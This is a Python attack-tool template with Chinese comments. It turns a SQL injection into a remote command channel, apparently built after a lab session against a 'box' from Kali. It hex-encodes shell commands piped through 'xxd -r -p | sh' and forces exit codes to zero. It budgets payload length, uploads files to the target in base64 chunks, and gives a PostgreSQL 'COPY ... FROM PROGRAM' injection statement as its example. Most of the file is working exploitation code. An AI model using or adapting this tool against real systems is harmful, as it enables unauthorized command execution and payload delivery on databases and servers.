#!/usr/bin/env python3
"""
channel-exec.py — 命令通道适配器模板（SQLi / RCE 回显类通道）

为什么需要它（DutyBound 会话实测，2026-10-25）：
  那一场用 PostgreSQL `COPY ... FROM PROGRAM` 当命令通道，三个坑各踩了 3–6 次：

    ① 子命令退出码非 0 → 整条 COPY 报错，拿不到任何 stdout
       → 连续 6 次"空结果"，其中 2 次被误判成"SQLi 停止工作"
    ② payload 上限 255（条件段长度字段是 2 位 hex）→ "LONG" 失败 3–4 次
    ③ 输出含换行 → 解析只拿到第一行，最后改用 hex 编码

  这三个都不是知识问题，是**通道适配问题**。换 MySQL UDF / MSSQL xp_cmdshell /
  SSH 会以另一种形式重现同样的三类坑。所以把适配逻辑固化成模板，换通道只改
  `send()` 一个函数。

用法：
  1. 复制本文件到目标工作目录（如 Kali 的 /root/<box>/chan.py）
  2. 只改 `send()` 与 `PAYLOAD_LIMIT` / `OVERHEAD` 三处
  3. `python3 chan.py selftest` 先验一遍预算与编码（不碰目标）
  4. `python3 chan.py run 'id'` 执行命令

三条硬约束（都是实测踩出来的，不要绕过）：
  · 命令一律包 `(cmd) 2>/dev/null; true` —— 让退出码恒为 0，否则通道会把
    "命令失败"变成"通道失败"，你分不清是哪一个。
  · 输出一律走 hex —— 换行、引号、二进制都会破坏基于分隔符的解析。
  · 发之前先算预算 —— 超长时**主动分块**，不要等通道报错再回头改。
"""

import binascii
import shlex
import sys

# ── 适配点 1/3：通道的 payload 上限与固定开销 ───────────────────────────────
# PAYLOAD_LIMIT：整条注入 payload 的字节上限（BCBP 条件段 2 hex → 255）。
# OVERHEAD     ：包装语句本身占用的字节数（前缀 + 后缀 + 分隔符），实测填进来。
#                预算 = PAYLOAD_LIMIT - OVERHEAD，超过就必须分块。
PAYLOAD_LIMIT = 255
OVERHEAD = 86

# 单块 base64 的最大长度：预算里再留出 `printf %s ... >> file` 的包装开销。
CHUNK_LIMIT = 120


def budget() -> int:
    """单条命令可用的字节数。"""
    return PAYLOAD_LIMIT - OVERHEAD


def wrap(cmd: str) -> str:
    """
    把任意命令包成"退出码恒为 0"的形态。

    这是坑 ① 的解药：`ls 不存在的文件` 会让整条 COPY 失败，
    包上 `|| true` 之后通道仍然成功，stdout 为空 —— 你能区分
    "命令没输出" 和 "通道坏了"。
    """
    return f'({cmd}) 2>/dev/null; true'


def to_hex(cmd: str) -> str:
    """把命令转成 `printf` 可还原的 hex —— 规避引号/换行/非 ASCII。"""
    return binascii.hexlify(cmd.encode()).decode()


def hex_reader(hexstr: str) -> str:
    """
    生成一条"把 hex 还原成命令并执行"的 shell 片段。

    这样通道里传输的永远是 `[0-9a-f]`，不会碰到引号转义问题。
    """
    return f'echo {hexstr} | xxd -r -p | sh'


# ── 适配点 2/3：通道实现 ────────────────────────────────────────────────────
def send(payload: str) -> str:
    """
    把 payload 送进通道，返回原始响应文本。

    ⚠️ 这是唯一需要按目标改的函数。示例（PostgreSQL COPY FROM PROGRAM）：

        def send(payload):
            stmt = ("x') ; COPY bp_scan_audit (airline_use) "
                    f"FROM PROGRAM $p${payload}$p$ ; --")
            return inject(stmt)      # 你原有的注入函数

    契约：
      · 成功 → 返回响应文本（可以为空字符串）
      · 通道层失败 → 抛 RuntimeError，由 run() 统一重试/降级
      · 不要把"命令失败"当成"通道失败"—— 命令已经由 wrap() 保证退出码 0
    """
    raise NotImplementedError(
        'send() 未实现：把这里换成你的通道（见 docstring 里的 COPY FROM PROGRAM 示例）'
    )


# ── 适配点 3/3：从响应里取回 stdout ─────────────────────────────────────────
def extract(response: str) -> str:
    """
    从通道响应里取出命令的 stdout。

    默认实现：假设响应里有一段纯 hex（由 `to_hex` 的逆过程产生）。
    如果你的通道把输出塞在 JSON 的某个字段里，改这里。
    """
    cleaned = ''.join(ch for ch in response if ch in '0123456789abcdefABCDEF')
    if cleaned == '':
        return ''
    if len(cleaned) % 2 != 0:
        cleaned = cleaned[:-1]
    try:
        return binascii.unhexlify(cleaned).decode('utf-8', 'replace')
    except (binascii.Error, ValueError):
        return ''


def run(cmd: str) -> str:
    """
    执行一条命令，返回 stdout。

    三件事在这里统一做掉，调用方不用管：
      1. 预算检查（超长直接报错，附带建议的分块数）
      2. 退出码归一（wrap）
      3. hex 编码 + 解码（to_hex / extract）
    """
    wrapped = wrap(cmd)
    hexed = to_hex(wrapped)
    # hex 是原长的 2 倍；真正的预算约束在"还原后执行的命令"上，
    # 但传输侧也要过一遍通道上限，所以两边都检查。
    if len(wrapped) > budget():
        need = (len(wrapped) + budget() - 1) // budget()
        raise ValueError(
            f'命令 {len(wrapped)} 字节超过通道预算 {budget()} 字节 —— '
            f'拆成 {need} 块，或用 upload() 先落盘再执行'
        )
    if len(hexed) > PAYLOAD_LIMIT:
        raise ValueError(f'hex payload {len(hexed)} 字节超过通道上限 {PAYLOAD_LIMIT}')

    return extract(send(hex_reader(hexed)))


def upload(local_path: str, remote_path: str) -> None:
    """
    把本地文件分块写到目标（超长命令的兜底方案）。

    分块的意义：一条 2KB 的脚本塞不进 169 字节的预算，但 15 个 120 字节的
    base64 块可以。DutyBound 那场就是这么传 XTest 注入器的。
    """
    with open(local_path, 'rb') as fh:
        blob = binascii.b2a_base64(fh.read()).decode().strip()
    run(f': > {remote_path}.b64')
    for i in range(0, len(blob), CHUNK_LIMIT):
        chunk = blob[i:i + CHUNK_LIMIT]
        run(f'printf %s {shlex.quote(chunk)} >> {remote_path}.b64')
    run(f'base64 -d {remote_path}.b64 > {remote_path} && rm -f {remote_path}.b64')


def selftest() -> int:
    """不碰目标，只验预算/包装/hex 往返。改完适配点先跑这个。"""
    fails = 0

    def check(label, cond):
        nonlocal fails
        if not cond:
            fails += 1
        print(f'  {"ok  " if cond else "FAIL"} {label}')

    check('预算为正', budget() > 0)
    check('wrap 让退出码恒 0', wrap('false').endswith('; true'))
    check('wrap 保留原命令', 'id' in wrap('id'))
    check('hex 往返一致', bytes.fromhex(to_hex('id; whoami')).decode() == 'id; whoami')
    check('hex 只含 hex 字符', set(to_hex('echo "a b"')) <= set('0123456789abcdef'))
    check('超长命令被拒', _raises(lambda: run('x' * (budget() + 1))))
    print(f'selftest: {"PASS" if fails == 0 else f"{fails} FAIL"}')
    return 0 if fails == 0 else 1


def _raises(fn) -> bool:
    try:
        fn()
        return False
    except (ValueError, RuntimeError, NotImplementedError):
        return True


def main(argv) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 2
    if argv[1] == 'selftest':
        return selftest()
    if argv[1] == 'budget':
        print(budget())
        return 0
    if argv[1] == 'run' and len(argv) >= 3:
        try:
            out = run(argv[2])
        except (ValueError, RuntimeError, NotImplementedError) as exc:
            print(f'error: {exc}', file=sys.stderr)
            return 1
        sys.stdout.write(out)
        return 0
    if argv[1] == 'upload' and len(argv) >= 4:
        try:
            upload(argv[2], argv[3])
        except (ValueError, RuntimeError, NotImplementedError, OSError) as exc:
            print(f'error: {exc}', file=sys.stderr)
            return 1
        return 0
    print(__doc__)
    return 2


if __name__ == '__main__':
    sys.exit(main(sys.argv))
